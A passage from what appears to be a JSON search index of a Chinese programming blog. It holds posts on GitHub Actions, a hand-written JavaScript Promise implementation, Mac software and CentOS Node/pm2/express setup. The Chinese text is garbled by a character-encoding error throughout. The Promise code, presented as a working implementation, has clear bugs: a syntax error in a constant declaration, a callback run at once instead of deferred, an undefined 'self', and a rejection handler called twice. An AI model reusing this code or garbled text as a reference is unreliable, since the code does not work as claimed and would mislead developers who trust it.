jobï¼ˆä»»åŠ¡ï¼‰ï¼šä¸€ä¸ªworkflowç”±ä¸€ä¸ªæˆ–å¤šä¸ªjobsæ„æˆï¼Œå«ä¹‰æ˜¯ä¸€æ¬¡æŒç»­é›†æˆçš„è¿è¡Œï¼Œå¯ä»¥å®Œæˆå¤šä¸ªä»»åŠ¡ stepï¼ˆæ­¥éª¤ï¼‰ï¼šæ¯ä¸ªjobç”±å¤šä¸ªstepæ„æˆï¼Œä¸€æ­¥æ­¥å®Œæˆ actionï¼ˆåŠ¨ä½œï¼‰ï¼šæ¯ä¸ªstepå¯ä»¥ä¾æ¬¡æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªå‘½ä»¤action 2.åŸºæœ¬ä½¿ç”¨ æ¯ä¸ªactionå°±æ˜¯ä¸€ä¸ªç‹¬ç«‹è„šæœ¬ï¼Œå¯åšæˆä»£ç ä»“åº“ï¼Œä½¿ç”¨userName/repoNameçš„è¯­æ³•å¼•ç”¨action\næ¯”å¦‚ï¼Œactions/setup-nodeå°±è¡¨ç¤ºä»“åº“github.com/actions/setup-nodeï¼Œä»£è¡¨ä¸€ä¸ªä½œç”¨æ˜¯å®‰è£…Node.jsçš„actionã€‚GitHubå®˜æ–¹çš„actionséƒ½æ”¾åœ¨github.com/actionsé‡Œã€‚æ³¨æ„ï¼ŒActionæœ‰ç‰ˆæœ¬çš„æ¦‚å¿µã€‚\nactions/setup-node@74bc508 # æŒ‡å‘ä¸€ä¸ª commit actions/setup-node@v1.0 # æŒ‡å‘ä¸€ä¸ªæ ‡ç­¾ actions/setup-node@master # æŒ‡å‘ä¸€ä¸ªåˆ†æ”¯ 3.èµ„æº åŸºæœ¬æ¦‚å¿µå’ŒåŸºç¡€ä½¿ç”¨\nå‚è€ƒï¼šGitHub Actions å…¥é—¨ | é˜®ä¸€å³° æœç´¢åˆ°ä»–äººæäº¤çš„actions\nGitHub Action å®˜æ–¹å¸‚åœº awesome-actions äºŒã€å¸¸ç”¨çš„GitHub Action 1. å‡†å¤‡workspaceï¼Œä¾¿äºæ•´ä¸ªå·¥ä½œæµè®¿é—® actions/checkout@v2 | å®˜æ–¹ é€‚ç”¨äºNode12ç‰ˆæœ¬ã€‚å¯¹äºNode20+ç‰ˆæœ¬ï¼Œè¦å‡çº§åˆ° actions/checkout@v3 peaceiris/actions-hugo@v2: è´Ÿè´£å‡†å¤‡å®‰è£…hugoæ‰“åŒ…æ„å»ºç¯å¢ƒ peaceiris/actions-gh-pages@v3: å®ç°hugoç¯å¢ƒä¸‹æ„å»ºå’Œå‘å¸ƒ å‚è€ƒ peaceiris/actions-gh-pages\nHub Mirror Action | Yikun 2. å®Œæˆlianpfç”¨æˆ·ä¸‹despositoryï¼Œä»githubåˆ°giteeçš„åŒæ­¥ Gitee Pages Action | yanglbme åœ¨ä¸ä½¿ç”¨Git Pages Proçš„å‰æä¸‹ï¼Œå®ç°Gitee Pagesçš„è‡ªåŠ¨éƒ¨ç½²\nå‚è€ƒ GitHub Actions å…¥é—¨ | é˜®ä¸€å³° æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/github-actions-common/","summary":"\u003cp\u003eæŒç»­é›†æˆç”±å¾ˆå¤šæ“ä½œç»„æˆï¼Œæ¯”å¦‚æŠ“å–ä»£ç ã€è¿è¡Œæµ‹è¯•ã€ç™»å½•è¿œç¨‹æœåŠ¡å™¨ï¼Œå‘å¸ƒåˆ°ç¬¬ä¸‰æ–¹æœåŠ¡ç­‰ç­‰ã€‚\u003ccode\u003eGitHub\u003c/code\u003eæŠŠè¿™äº›æ“ä½œå°±ç§°ä¸º\u003ccode\u003eactions\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"å·¥å…·: å¸¸ç”¨çš„GitHub Actions"},{"content":" ä¸€ã€Promiseçš„ä½¿ç”¨ åˆ›å»ºä¸€ä¸ªpromiseå®ä¾‹ï¼Œæ–¹ä¾¿å¤„ç†å¼‚æ­¥æ“ä½œ\nvar p = new Promise(function(resolve,reject){ setTimeout(function(){ resolve(\u0026#34;success\u0026#34;) },1000); console.log(\u0026#34;åˆ›å»ºä¸€ä¸ªæ–°çš„promise\u0026#34;); }) p.then(function(x){ console.log(x) }) // è¾“å‡ºï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„promise // è¾“å‡ºï¼šsuccess promise.then()é“¾å¼è°ƒç”¨\nvar p = new Promise(function(resolve, reject) { resolve() }); p.then(...).then(...).then(...) å…¶ä»–æ–¹æ³•ï¼š\nPromise.resolve() Promise.all() Promise.race() äºŒã€PromiseåŸç†å‰–æ 1.Promise å‡­å€Ÿä»€ä¹ˆæ¶ˆç­äº†å›è°ƒåœ°ç‹± 2.ä¸ºä»€ä¹ˆPromiseè¦å¼•å…¥å¾®ä»»åŠ¡ 3.Promise å¦‚ä½•å®ç°é“¾å¼è°ƒç”¨ æ­£æ–‡ã€‚ã€‚ã€‚\nä¸‰ã€æ‰‹å†™Promise/A+è§„èŒƒçš„Promise Promise/A+è§„èŒƒï¼š ã€æœ¯è¯­ã€ï¼š\npromiseæ˜¯ä¸€ä¸ªå¯¹è±¡æˆ–è€…å‡½æ•°ï¼Œè¯¥å¯¹è±¡æˆ–è€…å‡½æ•°æœ‰ä¸€ä¸ªthenæ–¹æ³• thenableæ˜¯ä¸€ä¸ªå¯¹è±¡æˆ–è€…å‡½æ•°ï¼Œç”¨æ¥å®šä¹‰thenæ–¹æ³• valueæ˜¯promiseçŠ¶æ€æˆåŠŸæ—¶çš„å€¼ reasonæ˜¯promiseçŠ¶æ€å¤±è´¥æ—¶çš„å€¼ è¦æ±‚ï¼š\npromiseå¿…é¡»æœ‰3ä¸ªçŠ¶æ€ï¼Œpendingã€fulfilled(resolved)å’Œrejected å½“å¤„äºpendingçŠ¶æ€çš„æ—¶å€™ï¼Œå¯ä»¥è½¬ç§»åˆ°fulfilled(resolved)æˆ–rejectedçŠ¶æ€ å½“å¤„äºfulfilled(resolved)çŠ¶æ€æˆ–rejectedçŠ¶æ€çš„æ—¶å€™ï¼Œåˆ™ä¸å¯å˜ ä¸€ä¸ªpromiseå¿…é¡»æœ‰ä¸€ä¸ªthenæ–¹æ³• thenæ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼špromise.then(onFulfilled, onRejected) onFulfilledæ–¹æ³•è¡¨ç¤ºçŠ¶æ€ä»pendingâ€”â€”\u0026gt;fulfilled(resolved)æ—¶æ‰€æ‰§è¡Œçš„æ–¹æ³• onRejectedè¡¨ç¤ºçŠ¶æ€ä»pendingâ€”â€”\u0026gt;rejectedæ‰€æ‰§è¡Œçš„æ–¹æ³•ã€‚ ä¸ºäº†å®ç°é“¾å¼è°ƒç”¨ï¼Œthenæ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªpromiseã€‚promise2=promise1.then(onFulfilled,onRejected) 1.PromiseåŸºç¡€ç»“æ„ æ‰§è¡Œå›è°ƒæ•°ç»„ï¼šå½“resolve()å»¶è¿Ÿæ‰§è¡Œæ—¶ï¼ŒPromiseçš„çŠ¶æ€ä¸ºpendingï¼Œä¸åº”ç«‹å³æ‰§è¡ŒæˆåŠŸè°ƒç”¨çš„å‡½æ•°ï¼Œéœ€è¦æŠŠå®ƒå­˜èµ·æ¥ï¼Œç›´åˆ°æ‰§è¡Œresolveå†æ‰§è¡ŒæˆåŠŸè°ƒç”¨çš„å‡½æ•° é“¾å¼è°ƒç”¨ï¼šPromiseé‡Œçš„é“¾æ¥è°ƒç”¨æ˜¯è¿”å›ä¸€ä¸ªæ–°çš„Promiseå¯¹è±¡ å¼‚æ­¥æ‰§è¡Œï¼šç”¨setTimeoutæ¨¡æ‹Ÿå¾®ä»»åŠ¡ï¼ˆJSäº‹ä»¶å¾ªç¯æ‰§è¡Œé¡ºåºä¸Šå’ŒåŸç”ŸPromiseæœ‰åŒºåˆ«ï¼‰ï¼ŒæŠŠå›è°ƒæ”¾å…¥ï¼Œç­‰å¾…ç¡®ä¿å¼‚æ­¥æ‰§è¡Œ åŸºç¡€Promiseï¼š\nconst isFunction = variable =\u0026gt; typeof variable === \u0026#39;function\u0026#39; // å®šä¹‰ä¸‰ä¸ªå¸¸é‡è¡¨ç¤ºçŠ¶æ€ const PENDING = \u0026#39;pending\u0026#39; const FULFILLED = \u0026#39;fulfilled\u0026#39;, const REJECTED = \u0026#39;rejected\u0026#39; class MyPromise { constructor(func) { this.onFulfilledArray = [] // æˆåŠŸå›è°ƒæ•°ç»„ this.onRejectedArray = [] // å¤±è´¥å›è°ƒæ•°ç»„ this.value = void 0 this.reason = void 0 this.status = PENDING func(this.resolve.bind(this), this.reject.bind(this)) } resolve(val) { if (this.status !== PENDING) return const self = this const doResolve = () =\u0026gt; { if (self.status === PENDING) { self.status = FULFILLED self.value = val // resolveé‡Œé¢å°†æ‰€æœ‰æˆåŠŸçš„å›è°ƒæ‹¿å‡ºæ¥æ‰§è¡Œ while (self.onFulfilledArray.length) { const fn = self.onFulfilledArray.shift() fn() } } } setTimeout(doResolve(), 0) } reject(err) { if (this.status !== PENDING) return const self = this const doReject = () =\u0026gt; { if (self.status === PENDING) { self.status = REJECTED self.reason = err // resolveé‡Œé¢å°†æ‰€æœ‰å¤±è´¥çš„å›è°ƒæ‹¿å‡ºæ¥æ‰§è¡Œ self.onRejectedArray.forEach(fn =\u0026gt; { fn() }) } } setTimeout(doReject, 0) } then(onFulfilled, onRejected) { let nextPromise = void 0 switch (this.status) { case PENDING: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { this.onFulfilledArray.push(() =\u0026gt; { try { let res = onFulfilled(self.value) resolve(res) } catch (error) { reject(error) } }) this.onRejectedArray.push(() =\u0026gt; { try { let res = onRejected(self.reason) resolve(res) } catch (e) { reject(e) } }) }) break case FULFILLED: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { try { let res = onFulfilled(self.value) resolve(res) } catch (e) { reject(e) } }) break case REJECTED: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { try { let res = onRejected(self.reason) resolve(res) } catch (e) { reject(e) } }) onRejected(self.reason) break } return nextPromise } catch(err) { // é»˜è®¤æ²¡æœ‰æˆåŠŸï¼Œåªæœ‰å¤±è´¥ return this.then(void 0, err) } } 2.é“¾å¼è°ƒç”¨è¿›é˜¶ç‰ˆ ä»¥ä¸Šçš„Promiseå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœé“¾å¼è°ƒç”¨ä¸­Promiseè¿”å›çš„æ˜¯æ™®é€šå€¼ï¼Œåº”è¯¥æŠŠå€¼åŒ…è£…æˆæ–°çš„Promiseå¯¹è±¡\nè¦æ±‚ï¼š\næ¯ä¸ªthenæ–¹æ³•éƒ½è¿”å›ä¸€ä¸ªæ–°çš„Promiseå¯¹è±¡ï¼ˆé‡ç‚¹ï¼‰ å¦‚æœthenæ–¹æ³•è¿”å›äº†ä¸€ä¸ªPromiseå¯¹è±¡ï¼Œåˆ™éœ€è¦æŸ¥çœ‹å®ƒçš„çŠ¶æ€ å¦‚æœçŠ¶æ€æ˜¯æˆåŠŸï¼Œåˆ™è°ƒç”¨resolveæ–¹æ³•ï¼ŒæŠŠæˆåŠŸçš„çŠ¶æ€ä¼ é€’ç»™å®ƒï¼› å¦‚æœæ˜¯å¤±è´¥çš„ï¼Œåˆ™æŠŠå¤±è´¥çš„çŠ¶æ€ä¼ é€’ç»™ä¸‹ä¸€ä¸ªPromiseå¯¹è±¡ å¦‚æœthenæ–¹æ³•ä¸­è¿”å›çš„æ˜¯ä¸€ä¸ªåŸå§‹æ•°æ®ç±»å‹å€¼ï¼ˆå¦‚ Numberã€String ç­‰ï¼‰å°±ä½¿ç”¨æ­¤å€¼åŒ…è£…æˆä¸€ä¸ªæ–°çš„Promiseå¯¹è±¡è¿”å› å¦‚æœthenæ–¹æ³•ä¸­æ²¡æœ‰returnè¯­å¥ï¼Œåˆ™è¿”å›ä¸€ä¸ªç”¨undefinedåŒ…è£…çš„Promiseå¯¹è±¡ å¦‚æœ then æ–¹æ³•æ²¡æœ‰ä¼ å…¥ä»»ä½•å›è°ƒï¼Œåˆ™ç»§ç»­å‘ä¸‹ä¼ é€’ï¼ˆå€¼çš„ä¼ é€’ç‰¹æ€§ï¼‰ å¦‚æœæ˜¯å¾ªç¯å¼•ç”¨åˆ™éœ€è¦æŠ›å‡ºé”™è¯¯ ä¿®æ”¹thenæ–¹æ³•ï¼Œå¢åŠ resolvePromiseå‡½æ•°\n... function resolvePromise(x, nextPromise, resolve, reject) { // å¤„ç†ä¸‰ç§æƒ…å†µï¼š // 1.å¾ªç¯å¼•ç”¨ // 2.x ä¸ºMyPromise // 3.xä¸ºåŸºç¡€ç±»å‹ if (x === nextPromise) { // x å’Œ nextPromise æŒ‡å‘åŒä¸€å¯¹è±¡ï¼Œå¾ªç¯å¼•ç”¨æŠ›å‡ºé”™è¯¯ã€‚é˜²æ­¢æ­»å¾ªç¯ return reject(new TypeError(\u0026#39;å¾ªç¯å¼•ç”¨\u0026#39;)) } else if (x \u0026amp;\u0026amp; (typeof x === \u0026#39;object\u0026#39; || isFunction(x))) { // x æ˜¯å¯¹è±¡æˆ–è€…å‡½æ•° let called = false // é¿å…å¤šæ¬¡è°ƒç”¨ try { let then = x.then // åˆ¤æ–­å¯¹è±¡æ˜¯å¦æœ‰ then æ–¹æ³• if (isFunction(then)) { // then æ˜¯å‡½æ•°ï¼Œå°±æ–­å®š x æ˜¯ä¸€ä¸ª MyPromiseï¼ˆæ ¹æ®Promise A+è§„èŒƒï¼‰ then.call( x, function(y) { // è°ƒç”¨è¿”å›çš„MyPromiseï¼Œç”¨å®ƒçš„ç»“æœä½œä¸ºä¸‹ä¸€æ¬¡thençš„ç»“æœ if (called) return called = true resolvePromise(y, nextPromise, resolve, reject) // é€’å½’è§£ææˆåŠŸåçš„å€¼ï¼Œç›´åˆ°å®ƒæ˜¯ä¸€ä¸ªæ™®é€šå€¼ä¸ºæ­¢ }, function(r) { if (called) return called = true reject(r) // å–thenæ—¶å‘ç”Ÿé”™è¯¯äº† } ) } else { resolve(x) // æ­¤æ—¶ï¼Œxæ˜¯ä¸€ä¸ªæ™®é€šå¯¹è±¡ } } catch (e) { reject(e) } } else { // x æ˜¯åŸå§‹æ•°æ®ç±»å‹ / æ²¡æœ‰è¿”å›å€¼ï¼Œè¿™é‡Œå³æ˜¯undefined resolve(x) } } class MyPromise { constructor(func) { ... } ... then(onFulfilled, onRejected) { const self = this // å¦‚æœonFulfilledä¸æ˜¯å‡½æ•°ï¼Œç»™ä¸€ä¸ªé»˜è®¤å‡½æ•°ï¼Œè¿”å›value let realOnFulfilled = onFulfilled if (!isFunction(realOnFulfilled)) realOnFulfilled = value =\u0026gt; value let realOnRejected = onRejected if (!isFunction(onRejected)) { realOnRejected = reason =\u0026gt; { if (reason instanceof Error) { throw reason } else { throw new Error(reason) } } } let nextPromise = void 0 switch (this.status) { case PENDING: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { this.onFulfilledArray.push(() =\u0026gt; { try { let res = realOnFulfilled(self.value) resolvePromise(res, nextPromise, resolve, reject) // resolve(res) } catch (error) { reject(error) } // onFulfilled(self.value) }) this.onRejectedArray.push(() =\u0026gt; { try { let res = realOnRejected(self.reason) resolve(res) } catch (e) { reject(e) } // onRejected(self.reason) }) }) break case FULFILLED: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { try { let res = realOnFulfilled(self.value) resolvePromise(res, nextPromise, resolve, reject) } catch (e) { reject(e) } }) // onFulfilled(self.value) break case REJECTED: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { try { let res = realOnRejected(self.reason) resolvePromise(res, nextPromise, resolve, reject) } catch (e) { reject(e) } }) onRejected(self.reason) break } return nextPromise } ... } 3.Promise.prototype.finallyå®ç° æœ‰ä¸¤å¤§é‡ç‚¹:\næ— è®ºå½“å‰è¿™ä¸ª Promise å¯¹è±¡æœ€ç»ˆçš„çŠ¶æ€æ˜¯æˆåŠŸè¿˜æ˜¯å¤±è´¥ ,finally æ–¹æ³•é‡Œçš„å›è°ƒå‡½æ•°éƒ½ä¼šæ‰§è¡Œä¸€æ¬¡ åœ¨ finally æ–¹æ³•åé¢å¯ä»¥ç»§ç»­é“¾å¼è°ƒç”¨ then æ–¹æ³•ï¼Œæ‹¿åˆ°å½“å‰è¿™ä¸ª Promise å¯¹è±¡æœ€ç»ˆè¿”å›çš„ç»“æœ æŒ‚è½½åœ¨MyPromise.propertyåŸå‹ä¸Šï¼Œæˆ–è€…ç±»ä¼¼catchå®ç°ï¼š\nMyPromise.prototype.finally = function(callback) { return this.then( data =\u0026gt; { return MyPromise.resolve(callback()).then(() =\u0026gt; data) }, err =\u0026gt; { return MyPromise.resolve( callback().then(() =\u0026gt; { throw err }) ) } ) } 4.Promise.all()å’ŒPromise.race()å®ç° Promise.all()ï¼šå¯å°†å¤šä¸ªPromiseå®ä¾‹åŒ…è£…æˆä¸€ä¸ªæ–°çš„Promiseå®ä¾‹ã€‚åŒæ—¶ï¼ŒæˆåŠŸå’Œå¤±è´¥çš„è¿”å›å€¼æ˜¯ä¸åŒçš„ï¼ŒæˆåŠŸçš„æ—¶å€™è¿”å›çš„æ˜¯ä¸€ä¸ªç»“æœæ•°ç»„ï¼Œè€Œå¤±è´¥çš„æ—¶å€™åˆ™è¿”å›æœ€å…ˆè¢«rejectå¤±è´¥çŠ¶æ€çš„å€¼\n... function isPromise(val) { return val \u0026amp;\u0026amp; typeof val.then === \u0026#39;function\u0026#39; } class MyPromise() { ... } ... MyPromise.all = function(promises) { if (!Array.isArray(promises)) { throw new Error(\u0026#39;Not a array\u0026#39;) } return new MyPromise((resolve, reject) =\u0026gt; { let result = [] let times = 0 // è®¡æ•°å™¨ function processData(index, val) { result[index] = val if (++times === promises.length) { resolve(result) } } for (let i = 0; i \u0026lt; promises.length; i++) { let p = promises[i] if (isPromise(p)) { // MyPromiseå¯¹è±¡ p.then(data =\u0026gt; { processData(i, data) }, reject) } else { processData(i, p) // æ™®é€šå€¼ } } }) } Promise.race()åœ¨æ‰§è¡Œå¤šä¸ªå¼‚æ­¥æ“ä½œä¸­ï¼Œä¸ç®¡ç»“æœæ˜¯æˆåŠŸçŠ¶æ€è¿˜æ˜¯å¤±è´¥çŠ¶æ€ï¼Œåªä¿ç•™å–ç¬¬ä¸€ä¸ªæ‰§è¡Œå®Œæˆçš„å¼‚æ­¥æ“ä½œçš„ç»“æœã€‚å…¶ä»–çš„æ–¹æ³•ä»ä¼šæ‰§è¡Œï¼Œä½†ç»“æœä¼šè¢«æŠ›å¼ƒ\n... class MyPromise() { ... } ... MyPromise.race = function(promises) { if (!Array.isArray(promises)) { throw new Error(\u0026#39;Not a array\u0026#39;) } return new MyPromise((resolve, reject) =\u0026gt; { if (promises.length === 0) { return } else { for (let p of promises) { p.then( value =\u0026gt; { resolve(value) }, reason =\u0026gt; { reject(reason) } ) } } }) } 5.æœ€ç»ˆæ‰‹å†™ç‰ˆæºç  ä»£ç å¤ªé•¿ï¼Œç›´æ¥å‚è€ƒæºç ä»“åº“ examples | lianpf.githubã€‚æ¬¢è¿star\nå‚è€ƒ æ€è·¯å¾ˆæ¸…æ™°çš„ä¸¤ç¯‡æ–‡ç« ï¼š\nES6ç³»åˆ—ä¹‹æ‰‹å†™Promise æ‰‹å†™Promise/A+ | ES5 æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/js-async-promise/","summary":"ä¸€ã€Promiseçš„ä½¿ç”¨ åˆ›å»ºä¸€ä¸ªpromiseå®ä¾‹ï¼Œæ–¹ä¾¿å¤„ç†","title":"JavaScript: å¼‚æ­¥ç¼–ç¨‹ä¹‹Promise"},{"content":"Macæ—¥å¸¸æˆ–è€…åŠå…¬è½¯ä»¶çš„ä½¿ç”¨\u0026hellip;\nä¸€ã€æ—¥å¸¸ 1.å¾®ä¿¡ï¼ˆåŒå¼€ï¼‰ Terminalè¾“å…¥ï¼š\n$ nohup /Applications/WeChat.app/Contents/MacOS/WeChat \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; æ¥æºï¼šAppleç¤¾åŒº\näºŒã€å·¥ä½œ 1.å½•å± QuickTime Playerï¼šMacè‡ªå¸¦å½•å±è½¯ä»¶ 2.Gif æ¨èä½¿ç”¨licecapåˆ¶ä½œGif\nå±å¹•å½•åˆ¶ + gifå›¾ç‰‡åˆ¶ä½œ QuickTime Playerå±å¹•å½•åˆ¶ PicGIFä¸‹è½½æˆ–aconvertåœ¨çº¿ç½‘ç«™åˆ¶ä½œ å¼€æºLICEcapåˆ¶ä½œGif å®‰è£… licecap licecapä½¿ç”¨ ä¸‰ã€lianpf Mac Pro Software Browseræµè§ˆå™¨ï¼š å¸¸ç”¨: Google Chromeã€Safariã€Microsoft Edge\nDeveloper Toolså¼€å‘å·¥å…· å¸¸ç”¨: Visual Studio Codeã€GoLandã€MongoDB Compassã€Sequel Proã€Another Redis Desktop Manager\nå…¶ä»–: å­—èŠ‚è·³åŠ¨å¼€å‘è€…å·¥å…·ã€å¾®ä¿¡å¼€å‘è€…å·¥å…·ã€PyCharmã€Xcodeã€Docker\nConfig Toolsé…ç½®é¡¹å·¥å…· å¸¸ç”¨: Charlesã€è°ƒåº¦ä¸­å¿ƒã€SourceTreeã€Postmanã€Chrome APPs \u0026amp; Extensions Developer Tool\nå…¶ä»–: SwitchHosts!ã€PicGo\nVPN Tools ğŸªœå·¥å…· å¸¸ç”¨: ClashX Proã€V2rayU\nå…¶ä»–: Shadowsocksã€EasyConnect\nWork å·¥å…· å¸¸ç”¨: æœ‰é“äº‘ç¬”è®°ã€XMindã€Foxmailã€Officeï¼ˆPages / Numbers /Keynoteï¼‰ã€ç½‘ç›˜ï¼ˆç™¾åº¦ç½‘ç›˜ / é˜¿é‡Œç½‘ç›˜ï¼‰\nå…¶ä»–: è¯­é›€ã€MindNodeã€å®ç›’ã€é’‰é’‰ã€LICEcap\nMusicéŸ³ä¹ å¸¸ç”¨: QQ éŸ³ä¹ã€ç½‘æ˜“äº‘éŸ³ä¹\nSocial Networkç¤¾äº¤ç½‘ç»œ å¸¸ç”¨: QQ ã€å¾®ä¿¡\nå…¶ä»–: Firefox\næ—¥å¸¸å·¥å…· å¸¸ç”¨: è¯å…¸ã€æ—¥å†ã€æé†’äº‹é¡¹ã€å¤‡å¿˜å½•ã€è®¡ç®—å™¨\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/mac-software-use/","summary":"\u003cp\u003eMacæ—¥å¸¸æˆ–è€…åŠå…¬è½¯ä»¶çš„ä½¿ç”¨\u0026hellip;\u003c/p\u003e","title":"å·¥å…·: Macè½¯ä»¶ä½¿ç”¨"},{"content":" ä¸€ã€ç¯å¢ƒé…ç½® centOS å®‰è£… node \u0026amp; é…ç½®å…¨å±€å˜é‡\n1.centos å®‰è£… node æ³¨æ„ï¼šå®‰è£…å’Œé…ç½®è¿‡ç¨‹ï¼Œä½¿ç”¨baseUserç”¨æˆ·ï¼Œè€Œä¸æ˜¯rootç”¨æˆ·\nå®‰è£…\u0026amp;è§£å‹\n// å¤„ç†ä¸Šä¼ çš„ xx-linux-x64.tar.xzåŒ… [baseuser@SHTL009065205 ~]$ cd /tmp [baseuser@SHTL009065205 tmp]$ mv node-v16.13.0-linux-x64.tar.xz ../node [baseuser@SHTL009065205 node]$ xz -d node-v16.13.0-linux-x64.tar.xz [baseuser@SHTL009065205 node]$ tar xf node-v16.13.0-linux-x64.tar é…ç½®ç¯å¢ƒå˜é‡æˆ–è½¯é“¾\n// è®¾ç½®è½¯é“¾ [baseuser@SHTL009065205 ~]$ ln -sv /node/node-v16.13.0-linux-x64/bin/npm /usr/local/bin/ [baseuser@SHTL009065205 ~]ll /usr/local/bin/ [baseuser@SHTL009065205 ~]ln -sv /node/node-v16.13.0-linux-x64/bin/node /usr/local/bin/ [baseuser@SHTL009065205 ~]ll /usr/local/bin/ æ³¨æ„ï¼šæœ€å¥½é…ç½®ç¯å¢ƒå˜é‡ï¼Œä¸è¦è®¾ç½®è½¯é“¾\n// é…ç½®ç¯å¢ƒå˜é‡ [baseuser@SHTL009065205 ~]$ cd node [baseuser@SHTL009065205 node]$ vim /etc/profile // è®¾ç½®node\u0026amp;npmç¯å¢ƒå˜é‡ [baseuser@SHTL009065205 ~]$ vim .bash_profile .bash_profileæ–‡ä»¶æœ«å°¾æ·»åŠ \nexport NODE_HOME=/node/node-v16.13.0 // NODE_HOMEåé¢çš„å€¼è¦æ·»åŠ åˆ°è‡ªå·±çš„nodeè§£å‹çš„è·¯å¾„ export PATH=$NODE_HOME/bin:$PATH [baseuser@SHTL009065205 ~]$ source .bash_profile // åˆ·æ–°é…ç½®æ–‡ä»¶ [baseuser@SHTL009065205 ~]$ node -v [baseuser@SHTL009065205 ~]$ npm root -g // æŸ¥çœ‹å…¨å±€packageçš„å®‰è£…ä½ç½® 2.pm2çš„å®‰è£…åŠå‘½ä»¤ [baseuser@SHTL009065205 ~]$ npm install pm2 -g // å…¨å±€å®‰è£… [baseuser@SHTL009065205 ~]$ pm2 --version å¸¸ç”¨çš„ pm2 å‘½ä»¤ï¼Œè¯¦è§å®˜ç½‘\n$ pm2 start bin/www // bin ç›®å½•ä¸‹çš„wwwå…¥å£æ–‡ä»¶ $ pm2 list // æ˜¾ç¤ºæ‰€æœ‰æœåŠ¡ // \u0026lt;\u0026gt;ç¬¦å·å†…ä¸ºå¯é€‰è¾“å…¥ ä¾‹ï¼špm2 stop www æˆ–è€… pm2 stop 0 $ pm2 stop \u0026lt;app_name|id|\u0026#39;all\u0026#39;|json_conf\u0026gt; // åœæ­¢æœåŠ¡ $ pm2 restart \u0026lt;app_name|id|\u0026#39;all\u0026#39;|json_conf\u0026gt; // é‡å¯æœåŠ¡ $ pm2 delete \u0026lt;app_name|id|\u0026#39;all\u0026#39;|json_conf\u0026gt; // åˆ é™¤æœåŠ¡ $ pm2 logs // æ‰“å°æ—¥å¿— äºŒã€å¯ç”¨NodeæœåŠ¡è®¿é—®é™æ€èµ„æº 1.express å®‰è£… 4.0ä»¥ä¸Šexpress è¦æ³¨æ„ï¼Œå¿…é¡»å®‰è£…express-generator\nå®‰è£…\n$ npm install -g express $ npm install express-generator -g $ express --version // æ£€æŸ¥ç‰ˆæœ¬ server.js\n// app.js const express = require(\u0026#39;express\u0026#39;) //åˆ›å»ºwebæœåŠ¡å™¨ const app = express() //å¯¼å…¥gzipåŒ… const compression = require(\u0026#39;compression\u0026#39;) //æ–‡ä»¶æ“ä½œ const fs = require(\u0026#39;fs\u0026#39;) const path = require(\u0026#39;path\u0026#39;) const chalk = require(\u0026#39;chalk\u0026#39;) //å¯ç”¨gzipä¸­é—´ä»¶,åœ¨æ‰˜ç®¡ä¹‹å‰ app.use(compression()) //æ‰˜ç®¡é™æ€èµ„æº app.use(express.static(path.resolve(__dirname, \u0026#39;./dist\u0026#39;))) app.get(\u0026#39;/\u0026#39;, function(req, res) { const html = fs.readFileSync(path.resolve(__dirname, \u0026#39;./dist/index.html\u0026#39;), \u0026#39;utf-8\u0026#39;) res.send(html) }) app.get(\u0026#39;/home\u0026#39;, function(req, res) { const html = 